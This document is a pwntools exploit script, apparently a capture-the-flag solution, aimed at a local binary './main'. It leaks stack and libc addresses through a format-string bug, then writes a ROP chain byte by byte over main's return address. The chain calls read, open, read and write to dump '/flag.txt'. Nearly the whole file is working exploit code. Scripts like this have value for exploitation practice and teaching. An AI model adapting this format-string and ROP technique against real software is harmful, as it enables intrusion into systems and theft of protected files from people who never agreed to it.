from pwn import *
from libformatstr import FormatStr
context.clear(arch="amd64")
env={"LD_PRELOAD":"./libc.so.6"}
p = process("./main")
payload ="AAAAAAAA%26$p-%38$p"
p.sendline(payload)
p.recvuntil("Oh, greetings AAAAAAAA")
data = p.recvline()
data = data.split("-")
leak = int(data[0],16)
print hex(leak)
pop_rdi = leak + 0xc23
print "pop_rdi: ",hex(pop_rdi)
leak2 = int(data[1],16)
print hex(leak2)
ret_ptr = leak2 - 0xd8
print "ret_ptr: ",hex(ret_ptr)
payload = ""
payload += "%31$p"

p.sendline(payload)
p.recvuntil("so you said: ")
data = p.recvline()
data = int(data,16)
wcs = data + 0x25b
pop_rax = 0x0000000000028ff4
base = wcs - 0x00000000000bfa40
pop_rax = base + pop_rax
pop_rsi = base + 0x000000000002709c
pop_rdx = base + 0x0000000000083f4a
to_call = base + 0x00000000000e7e8a
syscall = 0x000000000002588d
syscall = base + syscall
push_rsi = base + 0x0000000000045673
print "base: ",hex(base)
read = base + 0x0000000000111260
system = base + 0x00000000000554e0
binsh = system +0x161133
print "system: ",hex(system)
print "binsh: ",hex(binsh)
bin_base = pop_rdi - 0x0000000000000c63
print "bin_base: ",hex(bin_base)
datasec = bin_base + 0x0000000000202000 + 1
print "data section: ",hex(datasec)
print "read: ",hex(read)

##### buiding ROP chain

####Stage 1###########
#building a read(0,data_section,0x7f) ROP chain to write "/flag.txt" in the data section in order to use it in open call


###### writing "pop rdi; ret" gadget in the ret ptr of main function
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr]=(pop_rdi & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+1]=((pop_rdi>>8) & 0xff)
payload = f.payload(6)
#print payload
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+2]=((pop_rdi>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+3]=((pop_rdi>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+4]=((pop_rdi>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+5]=((pop_rdi>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+6]=((pop_rdi>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)


###### writing 0 : file descriptor of stdin
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+8]=0
payload = f.payload(6)
p.sendline(payload)


### Writing pop_rsi
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+16]=(pop_rsi & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+17]=((pop_rsi>>8) & 0xff)
payload = f.payload(6)
#print payload
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+18]=((pop_rsi>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+19]=((pop_rsi>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+20]=((pop_rsi>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+21]=((pop_rsi>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+22]=((pop_rsi>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

#### writing data section to put it in rsi with the gadget "pop rsi; ret" written before
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+24]=(datasec & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+25]=((datasec >> 8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+26]=((datasec >> 16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+27]=((datasec >> 24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+28]=((datasec >> 32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+29]=((datasec >> 40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+30]=((datasec >> 48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

### Writing "mov rdx 0xf7; mov rax,rdx; ret" gadget so we can control rdx register to perform a read and write call 
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+32]=(to_call & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+33]=((to_call>>8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+34]=((to_call>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+35]=((to_call>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+36]=((to_call>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+37]=((to_call>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+38]=((to_call>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

#### Writing read's libc address
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+40]=(read & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+41]=((read >> 8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+42]=((read >> 16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+43]=((read >> 24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+44]=((read >> 32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+45]=((read >> 40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+46]=((read >> 48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

####### Stage 2############################

## We will build a open(data_section,0) call cuz we wrote "/flag.txt" string in the data secion in stage 1

###### pop rdi
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+48]=(pop_rdi & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+49]=((pop_rdi>>8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+50]=((pop_rdi>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+51]=((pop_rdi>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+52]=((pop_rdi>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+53]=((pop_rdi>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+54]=((pop_rdi>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

## Wring data section next to put it in rdi register with "pop rdi; ret" gadget written before
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+56]=(datasec & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+57]=((datasec >> 8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+58]=((datasec >> 16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+59]=((datasec >> 24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+60]=((datasec >> 32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+61]=((datasec >> 40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+62]=((datasec >> 48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

### Writing "pop rsi; ret" gadget 
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+64]=(pop_rsi & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+65]=((pop_rsi>>8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+66]=((pop_rsi>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+67]=((pop_rsi>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+68]=((pop_rsi>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+69]=((pop_rsi>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+70]=((pop_rsi>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

###write 0 to put it in rsi register with "pop rsi; ret" gadget written before. 0 is read mode passed as open's second argument
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+72]=0
payload = f.payload(6)
p.sendline(payload)

Open = base + 0x0000000000110f80
##### Writing open's libc address next
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+80]=(Open & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+81]=((Open>>8) & 0xff)
payload = f.payload(6)
#print payload
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+82]=((Open>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+83]=((Open>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+84]=((Open>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+85]=((Open>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+86]=((Open>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

#### stage 3 ############ 

# We will perform a read(3,data_section,0x7f) call cuz after the open call the file descriptor of the opened "/flag.txt" file is 3.


### Writing "pop rdi; ret" gadget
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+88]=(pop_rdi & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+89]=((pop_rdi>>8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+90]=((pop_rdi>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+91]=((pop_rdi>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+92]=((pop_rdi>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+93]=((pop_rdi>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+94]=((pop_rdi>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+96]=0x0000000000000003
payload = f.payload(6)
print payload
p.sendline(payload)


### Writing "mov rdx 0xf7; mov rax,rdx; ret" gadget so we can control rdx register to perform a read and write call 
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+104]=(to_call & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+105]=((to_call>>8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+106]=((to_call>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+107]=((to_call>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+108]=((to_call>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+109]=((to_call>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+110]=((to_call>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

### Writing read's libc address next

f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+112]=(read & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+113]=((read >> 8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+114]=((read >> 16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+115]=((read >> 24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+116]=((read >> 32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+117]=((read >> 40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+118]=((read >> 48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

##### Stage 4 #################

# Now we have the content of "/flag.txt" file in the rsi register so all we need to do is to put 1 (stdout's file descriptor) in rdi register and perform write call: write(1,rsi,0x7f) 

#### Writing "pop rdi; ret" gadget
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+120]=(pop_rdi & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+121]=((pop_rdi>>8) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+122]=((pop_rdi>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+123]=((pop_rdi>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+124]=((pop_rdi>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+125]=((pop_rdi>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+126]=((pop_rdi>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

#### Writing 1 next to put it in rdi register; stdout's file descriptor
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+128]=0x0000000000000001
payload = f.payload(6)
print payload
p.sendline(payload)

##w Writing write's libc address next
Write = base + 0x0000000000111300
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+136]=(Write & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+137]=((Write>>8) & 0xff)
payload = f.payload(6)
#print payload
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+138]=((Write>>16) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+139]=((Write>>24) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+140]=((Write>>32) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+141]=((Write>>40) & 0xff)
payload = f.payload(6)
p.sendline(payload)
f=FormatStr(isx64=1,autosort=False)
f[ret_ptr+142]=((Write>>48) & 0xff)
payload = f.payload(6)
p.sendline(payload)

###### Stage 4 ########

## Sending "end of letter" string so the program exists the loop and go towards the "ret" instruction in main and we overwritten the return pointer with our ROP chain

## ===> "/flag.txt" file's content on the STDOUT. :D
p.sendline("end of letter")
p.sendline("/flag.txt\x00\n")
p.interactive()